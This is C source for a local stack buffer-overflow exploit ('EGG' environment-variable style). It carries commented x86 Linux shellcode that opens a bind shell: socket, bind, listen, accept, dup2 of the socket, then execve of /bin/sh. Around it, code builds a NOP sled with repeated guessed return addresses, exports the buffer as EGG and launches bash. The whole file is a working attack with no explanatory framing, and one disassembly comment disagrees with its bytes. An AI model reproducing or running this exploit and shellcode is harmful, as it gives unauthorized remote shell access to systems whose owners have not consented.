#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define DEFAULT_OFFSET 0
#define DEFAULT_BUFFER_SIZE 864
#define NOP 0x90

char shellcode[] =
"\x31\xc0"			// xorl		%eax,%eax
"\x50"				// pushl	%eax
"\x40"				// incl		%eax
"\x89\xc3"			// movl		%eax,%ebx
"\x50"				// pushl	%eax
"\x40"				// incl		%eax
"\x50"				// pushl	%eax
"\x89\xe1"			// movl		%esp,%ecx
"\xb0\x66"			// movb		$0x66,%al
"\xcd\x80"			// int		$0x80
"\x31\xd2"			// xorl		%edx,%edx
"\x52"				// pushl	%edx
"\x66\x68\x4a\xec"		// pushw	$0xdc23
"\x43"				// incl		%ebx
"\x66\x53"			// pushw	%bx
"\x89\xe1"			// movl		%esp,%ecx
"\x6a\x10"			// pushl	$0x10
"\x51"				// pushl	%ecx
"\x50"				// pushl	%eax
"\x89\xe1"			// movl		%esp,%ecx
"\xb0\x66"			// movb		$0x66,%al
"\xcd\x80"			// int		$0x80
"\x40"				// incl		%eax
"\x89\x44\x24\x04"		// movl		%eax,0x4(%esp,1)
"\x43"				// incl		%ebx
"\x43"				// incl		%ebx
"\xb0\x66"			// movb		$0x66,%al
"\xcd\x80"			// int		$0x80
"\x83\xc4\x0c"			// addl		$0xc,%esp
"\x52"				// pushl	%edx
"\x52"				// pushl	%edx
"\x43"				// incl		%ebx
"\xb0\x66"			// movb		$0x66,%al
"\xcd\x80"			// int		$0x80
"\x93"				// xchgl	%eax,%ebx
"\x89\xd1"			// movl		%edx,%ecx
"\xb0\x3f"			// movb		$0x3f,%al
"\xcd\x80"			// int		$0x80
"\x41"				// incl		%ecx
"\x80\xf9\x03"			// cmpb		$0x3,%cl
"\x75\xf6"			// jnz		<shellcode+0x40>
"\x52"				// pushl	%edx
"\x68\x6e\x2f\x73\x68"		// pushl	$0x68732f6e
"\x68\x2f\x2f\x62\x69"		// pushl	$0x69622f2f
"\x89\xe3"			// movl		%esp,%ebx
"\x52"				// pushl	%edx
"\x53"				// pushl	%ebx
"\x89\xe1"			// movl		%esp,%ecx
"\xb0\x0b"			// movb		$0xb,%al
"\xcd\x80"			// int		$0x80
;

void main(int argc, char *argv[]) {
  int i;
  unsigned char *buffer, *pointer;
  int address, *addptr;
  int offset=DEFAULT_OFFSET, buffersize=DEFAULT_BUFFER_SIZE;

  // define offset in stack
  if (argc>1) {
    offset = atoi(argv[1]);
  }

  // allocate memory
  if (!(buffer = malloc(buffersize))) {
    printf("Can't allocate memory.\n");
    exit(0);
  }

  // define address
  address = 0xbfffffff - offset;
  printf("Using address: 0x%x\n", address);

  // assign pointer
  pointer = buffer;
  addptr = (int*) pointer;

  // move noop sled up
  for (i=0; i<buffersize; i++) {
    buffer[i] = NOP;
  }

  addptr = addptr+35;

  // add address
  for (i=140; i<170; i+=4) {
    *(addptr++) = address;
  }

  //buffer[140] = address;

  pointer = buffer+744;


  // shell
  for (i=0; i<strlen(shellcode); i++) {
    *(pointer++) = shellcode[i];
  }
  printf("%d\n", strlen(shellcode));
  buffer[buffersize - 1] = '\0';

  for (i=0;i<buffersize;i++) {
    if(buffer[i] == 0) printf("Yo");
//    printf("0x%x ", buffer[i]);

  }

  memcpy(buffer, "EGG=", 4);
  putenv(buffer);
  system("/bin/bash");
}
